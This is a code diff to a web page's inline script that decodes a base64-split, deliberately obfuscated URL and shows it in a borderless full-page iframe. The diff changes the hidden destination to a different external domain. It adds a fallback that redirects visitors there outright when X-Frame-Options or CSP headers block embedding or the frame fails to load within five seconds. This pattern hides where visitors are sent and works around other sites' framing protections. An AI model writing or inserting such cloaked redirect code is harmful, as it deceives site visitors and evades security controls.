@@ -40,9 +40,9 @@
             // Wait for DOM to be ready
             function init() {
                 // Obfuscated URL - split and encoded
-                var _0x1a2b = ['aHR0cHM6L', 'y9zdWNjZX', 'NzLXN0b3J5', 'LWNhbXBhaW', 'duLmxvdmFi', 'bGUuYXBwLw'];
+                var _0x1a2b = ['aHR0cHM6Ly', '9zYWxlcy5', '3b21hY3Jv', 'bWF4LmNvb', 'S8='];
                 var _0x3c4d = function() {
-                    return _0x1a2b.join('') + '==';
+                    return _0x1a2b.join('');
                 };
                 
                 // Decode function
@@ -50,12 +50,14 @@
                     try {
                         return atob(str);
                     } catch(e) {
+                        console.error('Decode error:', e);
                         return '';
                     }
                 };
                 
                 // Get decoded URL
                 var targetUrl = _0x5e6f(_0x3c4d());
+                console.log('Target URL decoded:', targetUrl);
                 
                 // Create and load iframe
                 if (targetUrl && document.body) {
@@ -70,7 +72,30 @@
                     frame.style.border = 'none';
                     frame.style.display = 'block';
                     
+                    // Add error handling for iframe load issues
+                    frame.onerror = function() {
+                        console.error('Iframe failed to load');
+                        document.body.innerHTML = '<p style="padding: 20px; font-family: Arial;">Iframe blocked. The target site may have X-Frame-Options or CSP headers preventing embedding. Redirecting...</p>';
+                        setTimeout(function() {
+                            window.location.href = targetUrl;
+                        }, 2000);
+                    };
+                    
+                    frame.onload = function() {
+                        console.log('Iframe loaded successfully');
+                    };
+                    
                     document.body.appendChild(frame);
+                    
+                    // Fallback: if iframe doesn't load within 5 seconds, redirect
+                    setTimeout(function() {
+                        if (frame.contentWindow === null || frame.contentDocument === null) {
+                            console.warn('Iframe blocked - redirecting as fallback');
+                            window.location.href = targetUrl;
+                        }
+                    }, 5000);
+                } else {
+                    console.error('Failed to decode URL or body not ready');
                 }
             }
             
